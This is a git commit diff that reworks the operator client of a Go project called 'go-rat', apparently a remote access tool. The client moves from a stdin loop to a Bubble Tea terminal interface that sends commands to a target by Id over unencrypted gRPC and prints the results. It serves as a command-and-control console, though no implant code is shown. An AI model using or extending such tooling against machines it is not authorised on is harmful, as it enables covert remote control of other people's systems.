f8fb4fc0fb3ec634493dda366584abd270e44c85
nachh <iortego42madrid@gmail.com>
2024-06-09 20:16:46 +0200

    Primera version funcional con bubbleteas, multiples errores de formato e indentado

--- client/client.go
+++ client/client.go
@@ -1,52 +1,99 @@
 package main
 
 import (
-	"bufio"
 	"context"
 	"fmt"
+	"github.com/charmbracelet/bubbles/textinput"
+	tea "github.com/charmbracelet/bubbletea"
 	"github.com/charmbracelet/lipgloss"
 	"github.com/charmbracelet/log"
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 	"os"
-	"strings"
 )
 
 var prompt = lipgloss.NewStyle().
-	SetString("> ").
+	SetString("|> ").
 	Foreground(lipgloss.Color("#9fef00"))
 
-func mainLoop(client grpcapi.AdminClient) {
-	var (
-		ctx context.Context
-		cmd *grpcapi.Command
-		err error
-	)
-	ctx = context.Background()
-	cmd = new(grpcapi.Command)
-	cmd.Id = os.Args[1]
-	s := bufio.NewScanner(os.Stdin)
-	for {
-		cmd.Out = ""
-		fmt.Print(prompt.Render())
-		s.Scan()
-		cmd.In = strings.Trim(s.Text(), " \n")
-		cmd, err = client.RunCommand(ctx, cmd)
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println(cmd.Out)
-	}
+var bye = lipgloss.NewStyle().
+	SetString("Bye").
+	Border(lipgloss.RoundedBorder()).
+	Padding(0, 1).
+	Bold(true)
 
+var outputStyle = lipgloss.NewStyle().
+	Padding(0).
+	TabWidth(0)
+
+type model struct {
+	input  textinput.Model
+	client grpcapi.AdminClient
+	ctx    context.Context
+	cmd    *grpcapi.Command
+	id     *grpcapi.Identity
+}
+
+func initModel() *model {
+	var m *model = &model{}
+	m.input = textinput.New()
+	m.input.PromptStyle = prompt
+	m.input.Focus()
+	m.cmd = new(grpcapi.Command)
+	m.cmd.Id = os.Args[1]
+	m.ctx = context.Background()
+	return m
+}
+
+func (m model) exec() tea.Msg {
+	var _exec = func() tea.Msg {
+		var err error
+		m.cmd, err = m.client.RunCommand(m.ctx, m.cmd)
+		if err != nil {
+			return err.Error()
+		}
+		fmt.Println(m.cmd.Out)
+		return "ok"
+	}
+	return _exec()
+}
+
+func (m model) Init() tea.Cmd {
+	return nil
+}
+
+func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
+	var cmd tea.Cmd
+
+	switch msg := msg.(type) {
+	case tea.KeyMsg:
+		switch msg.String() {
+		case "enter":
+			m.cmd.In = m.input.Value()
+			m.cmd.Out = ""
+			m.input.Reset()
+			return m, m.exec
+		case "ctrl+c":
+			fmt.Println(bye.Render())
+			return m, tea.Quit
+		}
+	}
+	m.input, cmd = m.input.Update(msg)
+	return m, cmd
+}
+
+func (m model) View() string {
+	return m.input.View()
 }
 
 func main() {
 	var (
-		opts   []grpc.DialOption
-		err    error
-		conn   *grpc.ClientConn
-		client grpcapi.AdminClient
+		opts []grpc.DialOption
+		err  error
+		conn *grpc.ClientConn
+		//client grpcapi.AdminClient
+		m *model
 	)
 	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
 	conn, err = grpc.NewClient("127.0.0.1:9090", opts...)
@@ -54,6 +101,12 @@ func main() {
 		log.Fatal("[!] No se pudo establecer conexión con el servidor principal.", "ERROR", err)
 	}
 	defer conn.Close()
-	client = grpcapi.NewAdminClient(conn)
-	mainLoop(client)
+	m = initModel()
+	m.client = grpcapi.NewAdminClient(conn)
+	p := tea.NewProgram(m)
+	if _, err := p.Run(); err != nil {
+		log.Fatal(err)
+	}
+	//client = grpcapi.NewAdminClient(conn)
+	//mainLoop(client)
 }
